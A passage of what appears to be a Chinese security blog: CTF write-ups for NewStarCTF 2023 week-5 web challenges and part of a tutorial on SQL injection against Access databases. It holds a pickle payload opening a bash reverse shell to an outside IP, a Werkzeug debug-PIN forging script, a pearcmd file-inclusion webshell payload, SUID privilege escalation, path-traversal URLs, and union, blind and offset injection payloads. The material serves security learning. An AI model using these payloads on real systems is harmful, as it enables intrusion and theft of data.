\"payload\":\"eyJleHAiOjE2OTk2Nzk1OTYsImlhdCI6MTY5OTY3NTk5NiwianRpIjoiNWtZbXdDdTJkOXpBcFQ2N0l4a0kydyIsIm5iZiI6MTY5OTY3NTk5Niwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9\",\"signature\":\"35mISFjtHpWWuJ6BMQsUQCrZ5iLMGvUSIeu3S7uNsPp_b-VnH9VmFFrZFf41xRQOG0hXFE1nQUWU_gEjbVsC7vTB0U6Ia9joAYgmgLAom2-i7hFsaLzJItLGtgHhz-HmcKerJ5QCvQeqXdSsmhRESXdg3NHQ-lHS9-2go2BXOtJjSy-MwKrOZJ2KAAMWMCR_P-CRIaZ0s7dLX1oeAfS7V5gRh-_tJGejQ_U7-jyqOa1mgDIIgczZYIfY-1Su34GhT7kWUUNulFkqSDy6OjARtC1ZhGOHKVd50ITnsDnT_NSzXARmZuMKEe5_2_k2E_-l2Pm4aIAQeSpx7oY5ueUGxQ\"} 如下图，后边的cookie进行jwt解密一下即可看到我们的role是admin ![image-20231111121522491](NewStarCTF 2023/image-20231111121522491.png) 随机将右侧的session赋值给我们当前的cookie，进行admin的伪造，接着在pickle路由下，对pickle参数传入恶意代码进行RCE b'KGNvcwpzeXN0ZW0KUydiYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzEyNC4yMjAuMjMzLjI2LzU1NTUgMD4mMSInCm8=' ![image-20231111123516998](NewStarCTF 2023/image-20231111123516998.png) ![image-20231111123531742](NewStarCTF 2023/image-20231111123531742.png) 成功拿到flag WEEK5|WEB-pppython? &lt;?php if ($_REQUEST['hint'] == [\"your?\", \"mine!\", \"hint!!\"]){ header(\"Content-type: text/plain\"); system(\"ls / -la\"); exit(); } try { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $_REQUEST['url']); curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($ch, CURLOPT_HTTPHEADER, $_REQUEST['lolita']); $output = curl_exec($ch); echo $output; curl_close($ch); }catch (Error $x){ highlight_file(__FILE__); highlight_string($x-&gt;getMessage()); } ?&gt; curl_setopt(): The CURLOPT_HTTPHEADER option must have an array value 首先我们先给hint赋值为数组形式，来取得一些根目录的信息，这里我竟然不会，问了GPT发现要构造如下payload ?hint[]=your?&amp;hint[]=mine!&amp;hint[]=hint!! ![image-20231111144323387](NewStarCTF 2023/image-20231111144323387.png) 如图看到存在flag与app.py，那我们应该尝试去读取，接下来在看一下代码，发现可以进行ssrf与file配合读取一下文件内容 ?url=file:///app.py&amp;lolita[]=\"Content-type: text/plain from flask import Flask, request, session, render_template, render_template_string import os, base64 #from NeepuF1Le import neepu_files app = Flask(__name__) app.config['SECRET_KEY'] = '******' @app.route('/') def welcome(): if session[\"islogin\"] == True: return \"flag{***********************}\" app.run('0.0.0.0', 1314, debug=True)1 发现这依旧开启了debug模式，似乎暗示着我要计算PIN码？ 不过这里需要知道key是什么，但我也不知道如何找，只能继续看wp了，这里wp说： 使用以下脚本算cookie，注意machine_id中，/proc/self/cgroup字段的生成过程，以及cookie的生成方式 ![image-20231111155146958](NewStarCTF 2023/image-20231111155146958.png) 这里也看不懂上面图片的内容。。。。他直接给了脚本 # sha1 import hashlib import time from itertools import chain probably_public_bits = [ 'root' # /etc/passwd, /etc/shadow验证 'flask.app', # 默认值 'Flask',# 默认值 'Flask' '/usr/local/lib/python3.10/dist-packages/flask/app.py' # 报错得到 ] bid = \"8cab9c97-85be-4fb4-9d17-29335d7b2b8a\" did = \"12:hugetlb:/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-pod0604f7b8_b39d_4c8d_8daf_6fb4636bb08a.slice/docker-f7abee7266a5d18c009c35c7978cbfb3d46348fa36d942f0ee430159bc92b75f.scope\" did = did.strip().rpartition(\"/\")[2] print(did) private_bits = [ '20724999646420262722', # /sys/class/net/eth0/address 16进制转10进制 # machine_id由三个合并(docker就后两个)：1. /etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup bid + did # /proc/sys/kernel/random/boot_id ] h = hashlib.sha1() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit) h.update(b'cookiesalt') cookie_name = '__wzd' + h.hexdigest()[:20] num = None if num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9] rv = None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = num def hash_pin(pin: str) -&gt; str: return hashlib.sha1(f\"{pin} added salt\".encode(\"utf-8\", \"replace\")).hexdigest()[:12] print(rv) print(cookie_name + \"=\" + f\"{int(time.time())}|{hash_pin(rv)}\") # 8Gb9QOttxQ8IUbpZ3dxJ # http://localhost:1314/console?&amp;__debugger__=yes&amp;cmd=__import__(\"os\").popen(\"cat /flag\").read()&amp;frm=0&amp;s=8Gb9QOttxQ8IUbpZ3dxJ 8Gb9QOttxQ8IUbpZ3dxJ的由来我们可以执行如下payload： ?url=http://localhost:1314/console&amp;lolita[]= 查看源代码，其中的key就是上述字符串 最终payload： ?url=http://localhost:1314/console?&amp;__debugger__=yes&amp;cmd=__import__(\"os\").popen(\"cat /flag\").read()&amp;frm=0&amp;s=8Gb9QOttxQ8IUbpZ3dxJ&amp;lolita[]=Cookie: __wzdcdf8d549bf3448b85cde=1699692440|f54e820d6355 这里看着wp写的payload就是上面的，但不知为何我这里执行到如下页面之后，输入PIN码没反应。。。 ![image-20231111160337335](NewStarCTF 2023/image-20231111160337335.png) 感觉还是不太懂原理的问题，先做其他了，后面学了再看看 WEEK5|WEB-4-复盘 这里看题目给的附件，以为又是一个大型的审计代码题目，不过在index.php处就发现存在文件包含漏洞 &lt;?php require_once 'inc/header.php'; ?&gt; &lt;?php require_once 'inc/sidebar.php'; ?&gt; &lt;!-- Content Wrapper. Contains page content --&gt; &lt;?php if (isset($_GET['page'])) { $page ='pages/' .$_GET['page'].'.php'; }else{ $page = 'pages/dashboard.php'; } if (file_exists($page)) { require_once $page; }else{ require_once 'pages/error_page.php'; } ?&gt; &lt;!-- Control Sidebar --&gt; &lt;aside class=\"control-sidebar control-sidebar-dark\"&gt; &lt;!-- Control sidebar content goes here --&gt; &lt;/aside&gt; &lt;!-- /.control-sidebar --&gt; &lt;?php require_once 'inc/footer.php'; ?&gt; 虽然这里存在，但我惊讶于那些佬直接就判断出来这道题是pearcmd.php本地文件包含的利用。。。。 我们直接上payload： ?+config-create+/&amp;page=../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST['cmd']);?&gt;+shell.php bp抓包发送 ![image-20231111171355020](NewStarCTF 2023/image-20231111171355020.png) 蚁剑连接后，发现读取flag依旧没权限，得提权 ![image-20231111171559067](NewStarCTF 2023/image-20231111171559067.png) 看看suid提权如何： find&nbsp;/&nbsp;-user&nbsp;root&nbsp;-perm&nbsp;-4000&nbsp;-print&nbsp;2&gt;/dev/null find&nbsp;/&nbsp;-user&nbsp;root&nbsp;-perm&nbsp;-4000&nbsp;-print&nbsp;2&gt;/dev/null &gt; 1.txt 这里不知道为何，写入文件也不行了，只好直接看wp的答案 ![image-20231111172304259](NewStarCTF 2023/image-20231111172304259.png) 这里用的是gzip命令读取文件 gzip&nbsp;-f&nbsp;/flag&nbsp;-t 不过有个坑，我直接复制上去，一直显示我找不到命令什么的，手动输入才能成功读取flag ![image-20231111172352530](NewStarCTF 2023/image-20231111172352530.png) WEEK5|WEB-NextDrive ![image-20231111173036849](NewStarCTF 2023/image-20231111173036849.png) 发现test这个文件可疑，下载下来看看 HTTP/1.1 200 OK content-type: application/json; charset=utf-8 content-length: 50 date: Tue, 06 Oct 2023 13:39:21 GMT connection: keep-alive keep-alive: timeout=5 {\"code\":0,\"msg\":\"success\",\"logged\":true,\"data\":[{\"name\":\"すずめ feat.十明 - RADWIMPS,十明.flac\",\"hash\":\"5da3818f2b481c261749c7e1e4042d4e545c1676752d6f209f2e7f4b0b5fd0cc\",\"size\":27471829,\"uploader\":\"admin\",\"uploader_uid\":\"100000\",\"shareTime\":1699700843461,\"isYours\":true,\"isOwn\":true,\"ownFn\":\"すずめ feat.十明 - RADWIMPS,十明.flac\"},{\"name\":\"Windows 12 Concept.png\",\"hash\":\"469db0f38ca0c07c3c8726c516e0f967fa662bfb6944a19cf4c617b1aba78900\",\"size\":440707,\"uploader\":\"admin\",\"uploader_uid\":\"100000\",\"shareTime\":1699700845931,\"isYours\":true,\"isOwn\":true,\"ownFn\":\"Windows 12 Concept.png\"},{\"name\":\"信息安全技术信息安全事件分类分级指南.pdf\",\"hash\":\"03dff115bc0d6907752796fc808fe2ef0b4ea9049b5a92859fd7017d4e96c08f\",\"size\":330767,\"uploader\":\"admin\",\"uploader_uid\":\"100000\",\"shareTime\":1699700846014,\"isYours\":true,\"isOwn\":true,\"ownFn\":\"信息安全技术信息安全事件分类分级指南.pdf\"},{\"name\":\"不限速，就是快！.jpg\",\"hash\":\"2de8696b9047f5cf270f77f4f00756be985ebc4783f3c553a77c20756bc68f2e\",\"size\":32920,\"uploader\":\"admin\",\"uploader_uid\":\"100000\",\"shareTime\":1699700846039,\"isYours\":true,\"isOwn\":true,\"ownFn\":\"不限速，就是快！.jpg\"},{\"name\":\"test.req.http\",\"hash\":\"e3eef7bcdae39764a2950af878a290f301f322ca78ac17c08e9912d384c511a2\",\"size\":1085,\"uploader\":\"admin\",\"uploader_uid\":\"100000\",\"shareTime\":1699700849837,\"isYours\":true,\"isOwn\":true,\"ownFn\":\"test.req.http\"}]} 可以看到大概是每个文件对应文件名，哈希值和文件大小 这里注册个用户看看，不过不能注册admin，估计就是以admin的身份登录来获取flag 随便上传一个文件，F12发现有一个check的过程，看了之后如下图 ![image-20231111173439321](NewStarCTF 2023/image-20231111173439321.png) 显示了个无法秒传，之后就是看wp了 发现json数据只有哈希值和文件名，由于我们刚刚下载的文件里可能存在敏感信息，特别是test.req.http文件（因为靶场首页并没有该文件），那么我们在check时使用该文件对应的哈希值去绕过，从而下载下来该文件 ![image-20231111173852183](NewStarCTF 2023/image-20231111173852183.png) 我们观察到其请求体只含有fn与hash参数，那我们完全可以构造上述的test.req.http来手动上传该文件 这里官方wp对autop的解释：autoup 选项表示检测过服务器存在相同文件后直接 upload根据刚才的结果 我们bp构造请求 ![image-20231111174221977](NewStarCTF 2023/image-20231111174221977.png) 如图上传成功，我们将得到的文件下载下来看一下 POST /api/info/drive/sharezone HTTP/1.1 Accept: */* Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6 Cache-Control: no-cache Connection: keep-alive Content-Length: 0 Content-Type: application/x-www-form-urlencoded Cookie: uid=100000; token=eyJ1c2VybmFtZSI6ImFkbWluIiwidWlkIjoiMTAwMDAwIiwidG9rZW4iOiJlYzhlM2IzZGYwZTQ4N2FmNDVhYzFiZjIyNGJhOWVhMjViNjQyZTUyN2MyMjU0ZjFkNDQyNjM3YTUwYTQ3Y2MwIn0uY1NwBDFiH2dTfB8iDmJHaQ.BFkKSV5AcQR0RVFhT1QDFVRYDhldQytSf09RYBtXWkRQDwlLD016XXVCAmUfDltDUQsNTAxGKlZzTgo3GgVUQgINDRkMQypRcUYDZUsAAEZRWVkeCEwsXHVGATNJVFtCAggIS1kUK1cmFQNjGA4DQ1NeWU1YQyxRdk4KNB1TARQ Host: localhost:21920 Origin: http://localhost:21920 Pragma: no-cache Referer: http://localhost:21920/sharezone Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0 sec-ch-ua: \"Microsoft Edge\";v=\"119\", \"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\" sec-ch-ua-mobile: ?0 sec-ch-ua-platform: \"Windows\" 看到这里有了cookie值，猜测这个就是admin的凭证，我们或许要根据该凭证进行登录 bp抓包修改cookie值 ![image-20231111174628304](NewStarCTF 2023/image-20231111174628304.png) 如图成功以admin身份登录，这里登录进去但始终看不到share.js文件的出现，不知道是啥原因，所以我想直接略过看js源码了 这里回过头来又尝试了一下，发现似乎只有在F12处修改才可以 ![image-20231111194406842](NewStarCTF 2023/image-20231111194406842.png) 如上图，修改过后刷新页面即可得到 const Router = require(\"koa-router\"); const router = new Router(); const CONFIG = require(\"../../runtime.config.json\"); const Res = require(\"../../components/utils/response\"); const FileSignUtil = require(\"../../components/utils/file-signature\"); const { DriveUtil } = require(\"../../components/utils/database.utilities\"); const fs = require(\"fs\"); const path = require(\"path\"); const { verifySession } = require(\"../../components/utils/session\"); const logger = global.logger; /** * @deprecated * ! FIXME: 发现漏洞，请进行修改 */ router.get(\"/s/:hashfn\", async (ctx, next) =&gt; { const hash_fn = String(ctx.params.hashfn || '') const hash = hash_fn.slice(0, 64) const from_uid = ctx.query.from_uid const custom_fn = ctx.query.fn // 参数校验 if (typeof hash_fn !== \"string\" || typeof from_uid !== \"string\") { // invalid params or query ctx.set(\"X-Error-Reason\", \"Invalid Params\"); ctx.status = 400; // Bad Request return ctx.res.end(); } // 是否为共享的文件 let IS_FILE_EXIST = await DriveUtil.isShareFileExist(hash, from_uid) if (!IS_FILE_EXIST) { ctx.set(\"X-Error-Reason\", \"File Not Found\"); ctx.status = 404; // Not Found return ctx.res.end(); } // 系统中是否存储有该文件 let IS_FILE_EXIST_IN_STORAGE try { IS_FILE_EXIST_IN_STORAGE = fs.existsSync(path.resolve(CONFIG.storage_path, hash_fn)) } catch (e) { ctx.set(\"X-Error-Reason\", \"Internal Server Error\"); ctx.status = 500; // Internal Server Error return ctx.res.end(); } if (!IS_FILE_EXIST_IN_STORAGE) { logger.error(`File ${hash_fn.yellow} not found in storage, but exist in database!`) ctx.set(\"X-Error-Reason\", \"Internal Server Error\"); ctx.status = 500; // Internal Server Error return ctx.res.end(); } // 文件名处理 let filename = typeof custom_fn === \"string\" ? custom_fn : (await DriveUtil.getFilename(from_uid, hash)); filename = filename.replace(/[\\\\\\/\\:\\*\\\"\\'\\&lt;\\&gt;\\|\\?\\x00-\\x1F\\x7F]/gi, \"_\") // 发送 ctx.set(\"Content-Disposition\", `attachment; filename*=UTF-8''${encodeURIComponent(filename)}`); // ctx.body = fs.createReadStream(path.resolve(CONFIG.storage_path, hash_fn)) await ctx.sendFile(path.resolve(CONFIG.storage_path, hash_fn)).catch(e =&gt; { logger.error(`Error while sending file ${hash_fn.yellow}`) logger.error(e) ctx.status = 500; // Internal Server Error return ctx.res.end(); }) }) module.exports = router; 可以看注释有hint存在漏洞。首先是给了处理GET请求的路由，其中路径为./s/加上参数hashfn，检测前64位是否为哈希值，然后从请求中获取参数fn和from_uid，其中from_uid表示下载的文件是这个 uid 的用户分享的；接着就是参数检测，是否为共享文件（参数为哈希值和from_uid），是否存储该文件，然后文件名处理；最后发送时利用path.resolve函数处理，注意里面的参数hash_fn是完全可控的，我们只需要让64位哈希值后面跟上…/即可实现路径穿越 不过这里/被过滤了，我们需要url编码一下 http://node4.buuoj.cn:28489/s/5da3818f2b481c261749c7e1e4042d4e545c1676752d6f209f2e7f4b0b5fd0cc%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd?from_uid=100000 ![image-20231111194656272](NewStarCTF 2023/image-20231111194656272.png) 如上图成功下载得到，接下来读取环境变量即可 /s/5da3818f2b481c261749c7e1e4042d4e545c1676752d6f209f2e7f4b0b5fd0cc%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron?from_uid=100000 ![image-20231111194814579](NewStarCTF 2023/image-20231111194814579.png) 0x03 参考文章 浅谈文件包含之包含pearcmd.php漏洞 [wp]NewStarCTF 2023 WEEK3|WEB [从[2020安洵杯]赛后以及近期遇到的SSTI总结] PHP的GC机制 浅析PHP GC垃圾回收机制及常见利用方式–先知社区 php(phar)反序列化漏洞及各种绕过姿势 phar文件上传的骚姿势（绕过phar、_HALT） php反序列化拓展攻击详解–phar Phar的一些利用姿势 gzip","tags":["CTF赛事"],"categories":["CTF赛事"]},{"title":"SQL注入之Access篇","path":"/2023/10/08/sql-zhu-ru-zhi-access-shu-ju-ku/","content":"0x01 前言 之前只是学习了最基础的MySQL数据库注入，然后看了小迪的课认为还是很有必要赶紧拓展的，于是我就写此文章学习一下一些其他数据库的特性：如常规注入语句、数据库本身的特性、与MySQL数据库的区别。话不多说，直接开卷！ 0x02 概括 ​ SQL注入是非常常见的一个漏洞，如果程序员在编写网站源码时未对SQL执行语句作防护措施，那么用户输入就可以执行SQL语句，导致用户数据被删改、拖库、挂马等。而它的种类也根据参数类型、提交方式、注入方式以及数据库类型的不同来进行区分。 ​ Access数据库是一种小型数据库用于储存数据，其中各个对象之间可以建立关联，方便用户快速查询与调用数据。它相对其他数据库来说比较简单，只有一个数据库，里面存放着表、列以及数据，通过简单的语句就可以完成注入。一般通过联合注入、逐字猜解、偏移注入等方式进行攻击，在面对搭载这类数据库的网站时，也可以针对.mdb和.asp后缀名的文件进行爆破，说不定存在信息泄露可以直接拿到数据库。本文主要针对Access数据库的注入的原理以及攻击方式进行归纳。 这里搞一个常见数据库组合小tip： asp/: sql server, Access .net : sql server php: PostgreSQL, Mysql java: Oracle, Mysql SQL注入判断数据库类型 0x03 注入思路 1、通过报错或常见组合判断数据库类型（MySQL+PHP、MSSQL+ASPX、Oracle+JSP…） 2、截取请求包更换请求方式（POST、GET…）或更改请求包参数（Cookie、Referer、User-Agent…）寻找注入点 3、通过单引号、百分号来判断注入参数类型（数字型、字符型、搜索型…） 4、选择攻击注入方式（联合注入、逐字猜解、偏移注入…） 5、判断是否能猜解到表名、列名，主要分为以下三种情况： - 如果能猜解到表名和列名，那么可以使用联合注入或逐字猜解 - 如果只能猜解到表名，无法猜解到列名，那么可以使用偏移注入 - 如果无法猜解到表名或列名，那么可以查看网站源代码、提交的参数来构造表名（还不行的话就赶紧溜吧，无从下手的） 6、获取数据库中的敏感数据登录后台或直接写入webshell 下面先讲理论，之后实战操作一下。 0x04 注入方式 判断是否存在注入点： 粗略型：提交单引号' 逻辑型（数字型注入）：and 1=1 或 and 1=2 逻辑型（字符型注入）：' and '1'='1 或 'and '1'='2 逻辑型（搜索型注入）：%' and 1=1 and '%'='% 或 %' and 1=2 and '%'='% 4.1 联合注入 1、判断注入点，一般来说单引号、减号、and等就可以判断是否存在注入 ?id=3' #返回页面与id=3不同，说明存在注入 ?id=3-1 #返回一个与id=3不同的正常界面，说明已经代入数据库执行，存在注入 ?id=3 and 1=2 #返回页面与and 1=1不同，说明已经完成了真假判断，存在注入 2、通过order by 判断字段数，将字段数从小到大以此类推，直至返回错误页面，而正确的字段数就是返回错误的字段数减一 ?id=3 order by 1 ... ?id=3 order by 10 #返回错误页面，字段数为9 3、通过联合查询 select * from article where id= -1 union select 1,[column_name],3 from [table_name] 如：-1 union select 1,username,password,4,5,6,7,8,9,10 from admin 那么在实际场景中，只需要先找到注入点，通过order by进行字段判断，再使用可控输入对目标数据库进行联合注入即可，本质上和 MySQL的联合注入差不多，不过它没有information_schema库，需要猜解它的表名和列名，如果猜对了就会在网页上回显账号密码。可 以将以下常用的表名和列名进行猜解。 常见的表名： admin,a_admin,x_admin,m_admin,adminuser,admin_user,article_admin,administrator,manage,manager,member,memberlist,user,users,Manage_User,user_info,admin_userinfo,UserGroups,user_list,login,用户,Friend,zl,movie,news,password,clubconfig,config,company,book,art,dv_admin,userinfo 常见的列名： username,adminusername,admin_username,adminname,admin_name,admin,adminuser,admin_user,usrname,usr_name,user_admin,password,admin_password,administrator,administrators,adminpassword,adminpwd,admin_pwd,adminpass,admin_pass,usrpass,usr_pass,user,name,pass,userpass,user_pass,userpassword,user_password,pwd,userpwd,user_pwd,useradmin,pword,p_word,pass-wd,yonghu,用户,用户名,密码,帐号,id,uid,userid,user_id,adminid,admin_id,login_name 4.2 逐字猜解 access数据库函数查询可参考：MS Access 常用函数 逐字猜解其实到最后用的就是布尔盲注，根据目标的返回页面差异来判断注入是否成功，比较依赖运气，需要依赖强大的字典，一般采用的SQL语句如下 select * from admin where id= * 如：834 and (select top 1 asc(mid(admin_name,2,1)) from admin)=104 //这里的asc是返回字符的ascii码值。 //mid函数为从指定字符串中提取一些字符 1、判断表名 实际上就是对表名进行猜解，再根据表名做进一步操作 ?id=843 and exists(select * from [table_name]) ?id=843 and exists(select * from admin1) #返回错误界面 ?id=843 and exists(select * from admin) #返回正常界面 2、猜解列名 ?id=843 and exists(select [column_name] from admin) ?id=843 and exists(select admin_id from admin) #页面正常，列名正确 ?id=843 and exists(select admin_name from admin) #页面正常，列名正确 ?id=843 and exists(select admin_pass from admin) #页面报错，列名错误，未猜出密码列名 猜解出了目标id和用户名的列名分别是admin_id和admin_name，但未猜解出密码列名 3、通过布尔盲注获取数据 判断字段长度 ?id=834 and (select top 1 len(admin_name) from admin) &gt; [length] ?id=834 and (select top 1 len(admin_name) from admin) &gt; 8 #页面报错，长度小于或等于8 ?id=834 and (select top 1 len(admin_name) from admin) = 7 #页面正常，长度等于7 判断数据，这里可以使用burp或直接写脚本跑即可 ?id=834 and (select top 1 asc(mid(admin_name,1,1)) from admin) &lt; [length] ?id=834 and (select top 1 asc(mid(admin_name,1,1)) from admin)&lt;113 #页面报错，admin_name列第一个数据ascii码大于等于113 ?id=834 and (select top 1 asc(mid(admin_name,1,1)) from admin)=113 #页面正确，说明第一个数据ascii码为113，查询ascii表为r ?id=834 and (select top 1 asc(mid(admin_name,2,1)) from admin)=104 #页面正确，说明第二个数据ascii码为104，查询ascii表为h 最后拿到用户名 4.3 偏移注入 ​ 偏移注入的前提是需要猜出表名且知道一个或多个字段，这个前提可以使用之前的方法获得。它的优势和劣势一样突出，优势是无需用户名和密码的字段就可以直接爆出账号密码，劣势是也需要运气，不能保证绝对成功。 ​ 主要原理是拿到order by判断出的字段数x以及回显正常的*，然后再用order by的字段数x减去2倍的*值即是所需字段数。例如字段数为22，回显正常的*值为6，所需的字段数就是22-2x6=10，根据该值进行构造即可完成偏移注入。 这里我感觉他解释的不清楚，于是找了几篇文章继续学习： 偏移注入的原理 （这里只是粗略的概述，详细请看下面）： 就是将目标表进行(多级)内连接，通过联合查询和已知目标字段名的微调，将我们想要知道的字段值在已经确定的显示位上暴露出来。 影响偏移注入成功率的因素（当然这些因素都是影响因素，不是决定因素）： 联合查询中显示位的位置 当前注入点所查询的字段数量 目标表的字段数量 我们可以猜解到的目标表的字段名的数量 这里先借助那篇文章的图片了┭┮﹏┭┮ 此次实战测试主要涉及的两张表：product表和admin表 product表：该表有22个字段 admin表：该表有6个字段（请谨记这个字段数） 1.exist()函数：用于检查子查询是否至少会返回一行数据，该子查询实际上并不返回任何数据，而是返回值True或False。 2.as关键字：用于起别名，可以为表起别名，也可以为字段起别名（as关键字可省略） 3.表1 inner join 表2 on 筛选条件 ：该关键字用于将表1与表2做笛卡尔积，然后根据on后面的条件进行筛选。 4.top n 关键字：作用是使查询结果只显示前n条记录 下图中select语句的意思是：将admin表与自己做笛卡尔积，然后筛选出两者id值相同的记录 下图意思为：查询 admin 表的前六个数据 4.3.1 注入原理 为了方便讲解，这里选择 “实战” 和 “偏移注入的注入原理” 相结合的方式进行讨论。 偏移注入的流程是： 判断是否存在注入点 判断当前注入点所查询的字段数量 （请一定谨记以下的简略表述，后面的文章均采用以下简略表述） 使用sql语句帮助理解：select 当前字段数量 from 当前表 union select ... from 目标表 在这里【当前表】-&gt;product表；【目标表】-&gt;admin表 猜解目标表的表名 确定显示位 确定目标表的字段数量 开始进行偏移注入，经过不断的“微调”，将我们想要的字段值在显示位处暴露出来。 4.3.2 判断是否存在注入点 ?id=1513 and 1=1 页面回显正常 ?id=1513 and 1=2 页面回显错误 这里不知为何我的1=2之后页面什么也没有，只能右键源代码看到页面是报错的 这里说明存在注入点，且为数字型注入 4.3.3 判断当前字段数量 ?id=1513 order by 22 页面显示正常 ?id=1513 order by 23 页面显示错误 说明当前表名下的字段数为22 4.3.4 猜测当前表的表名 这里我看文章用的是exists方式，其实常规的话应该是如下payload UNION select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin 也就是联合注入方式。这里找到一篇文章说： 联合查询法：速度快，兼容性不好 逐字猜解发：速度慢，兼容性好--也就是上述的exists方法 这里呢我在最后再放出两种方法的注入语句的总结吧。 ?id=1513 and exists(select * from admin) ​ 因为access数据库没有类似于mysql的information_schema这样的系统索引库，所以我们只能根据经验靠猜了，在真实的测试环境中，我们也可以通过社工的方式进行猜解。 此次页面返回正常，说明存在access数据库中存在admin表。 我们也可以进一步验证一下，改一下参数看看页面的变化 可以看到报错了，说明不存在该表 4.3.5 确定回显位 ?id=1513 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin 这里前面依旧添加1=2是为了让1513 and 1=2这个整体报错，以防占用回显位。 如上图所示发现回显位为3、9、13、15 至于为何这里非要在后面加入from admin我也产生了疑问，因为我记得mysql数据库是不需要的，于是我去掉这俩单词后发现如下 如图，这代表我们在查询回显位还必须带一个正确的表。。。。 4.3.6 确定目标表的字段数量 这里是确定admin表的字段数量（注意这里还要在确定的原因我想是，我们进入该页面查询的时候，当前表并非admin表） 这里呢我们根据当前页面路径去源码查找验证一下 如上图，果然这里查询的表为product表 ?id=1513 and exists(select * from admin order by 6) 页面回显正常 ?id=1513 and exists(select * from admin order by 7) 页面回显错误 说明admin表的字段数为6个，我们查看数据库验证一下 如上图很明显是正确的！ 4.3.7 进行偏移注入 偏移注入的基本公式： 联合查询所要补充的字段数 = 当前字段数量 - 目标表的字段数 x N（N=1,2...）【注意：“联合查询所要补充的字段数” 指的是union关键字后面的select查询所需补充的字段数】 在此处即为：联合查询补充字段数 = 当前字段数量（22） - admin表的字段数（6） x N 当N=1时我们称为 “1级偏移注入”，当N=2时我们称为 “2级偏移注入”；当N=3时我们称为 “3级偏移注入”，… 1级偏移注入的payload： 根据公式我们可以计算出：联合查询补充字段数 = 22-6x1 = 16 ?id=1513 union select top 1 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16, * from admin 在这里我们解释一下，为什么1级偏移注入并没有爆出我们想要的字段值呢： 由前面的步骤我们已经得知，已经确定的显示位只有 3,9,13,15 四个，即只有处于第3,9,13,15这四个字段的数据才可以显示出来， 但是我们观察下标发现，在进行1级偏移注入时，admin表的数据实际上是排在了17号字段之后了，当然不会在页面中显示出来。 那么我们怎么样才可以将admin表的数据向前移动，以致可以使其处于第3,9,13,15号字段而显示出来呢？ 答案是：我们可以进行2级(多级)偏移注入（即通过admin表的自连接使得sql语句中“ * ”所代表的的字段数增大，那么联合查询中用于充数字段就会减小，这样的话，admin表中的数据自然会向前移动了） 这里附上参考文章的图片，解释的比较清晰 2级偏移注入的payload： 根据公式我们可以计算出：联合查询补充字段数 = 22-6x2 = 10 ?id=1513 union select 1,2,3,4,5,6,7,8,9,10, * from (admin a inner join admin b on a.id=b.id) 这里我们输入payload之后查看源代码发现13回显位爆出了加密的密码 但这是为什么呢？ 通过分析下图我们发现，经过2级偏移注入，我们成功的将admin表的数据向前移动了6个字段，使其原本在17号字段及其之后才显现出的数据，变为了在11号字段及其之后就可回显而出。而此时admin表的password字段和count_time字段恰好处于显示位13和15上，于是就自然而然的暴露了出来。 那又为什么admin表的数据会向前移动6个字段呢？ 原因就是，由于admin表进行了一次自连接，使得payload中from关键字后面的表由原有的 “admin表” 变成了：由“先让admin自己做笛卡尔积然后挑选id值相等的记录”组成的表。这样的话，payload中的“ * ”就由原来所代表的 “admin表” 中的6个字段，变为了现在所代表的 “admin自连接表” 的12个字段，又由于union关键字的使用，要求union关键字后面select查询的字段数必须要等于前面select查询的字段数，所以union关键字后面的select中用于充数的字段由原来的22-6=16变为了22-12=10个字段，因此由于充数的字段变少了，那么admin表的数据自然的就可以向前移动了。 请注意：admin表中的数据向前移动的字段数只能是admin表（即目标表）字段数的整数倍（这是由表自连接的特性所决定的）。 但这里我的admin表似乎数据不对劲，只有一组数据，怪不得我一直搞不懂上述操作的原理 （我还以为是我傻）。。。。 不过仔细阅读参考文章，我认为这里进行笛卡尔积的操作之后是将同id（6个字段）连接了起来而形成12个字段的“新表” 附上图片： 在此我们已经爆出了admin表的密码， 此时，其实admin表的admin字段就紧挨在password字段的前方（其实在实战环境中我们是不确定admin字段是在前还是在后的，此处只是为了方便原理的讲解，就直接告诉你了） 那么我们是否仍然可以将数据向前移动而爆出admin字段的值呢？在这里显然是不行的，因为我们只能向前移动admin表的字段数量的整数倍（在这里即是6的整数倍），而此时admin表的admin字段此时所处字段为12号字段，再向前移动6个字段的话，admin字段就处于6号字段处了，仍然没有与显示位的位置发生重合。 到了这里，细心的同学会发现： 之前我们讲的都是如何将admin表中的数据向前移动，那么我们可不可以使得数据向后移动呢？要是可以向后移动的话，紧接着2级偏移，然后让数据向后移动一个字段，不就正好让admin字段处于13号显示位了吗？ 恭喜你！你的想法是对的，我们的确可以让admin表的数据向后移动，不过遗憾的是，向后移动的字段数仍然取决于：我们能够猜解出admin表中多少个字段名。若猜解出1个字段名，那么我们就可以让数据向后移动1个字段数，若猜解出2个字段名，那么我们就可以让数据向后移动2个字段数，以此类推。（不过这里所需要猜解的字段名不需要是我们想要查找的字段名，只要是admin表中的字段名均可），原因请继续往后阅读： 微调payload： ?id=1513 union select top 1 1,2,3,4,5,6,7,8,9,10,b.id, * from (admin a inner join admin b on a.id=b.id) 